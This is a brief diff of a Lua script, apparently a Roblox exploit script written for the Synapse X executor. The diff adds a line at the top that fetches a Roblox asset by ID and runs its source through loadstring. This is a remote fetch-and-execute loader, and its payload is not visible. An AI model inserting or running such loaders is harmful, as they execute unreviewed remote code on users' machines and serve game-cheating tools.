@@ -1,3 +1,5 @@
+loadstring(game:GetObjects("rbxassetid://5209815302")[1].Source)()
+
 if syn then
     local CoreGui = game:GetService("StarterGui")
 
